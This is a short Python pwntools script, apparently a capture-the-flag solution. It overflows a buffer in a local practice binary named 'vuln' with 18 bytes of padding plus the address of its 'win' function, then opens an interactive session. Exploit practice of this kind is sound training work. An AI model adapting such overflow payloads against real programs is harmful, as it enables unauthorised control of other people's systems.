from pwn import *

p = process("./vuln")
e = ELF("./vuln")

win = e.sym['win']

payload = b"A" * 18 + p64(win)

p.sendline(payload)
p.interactive()
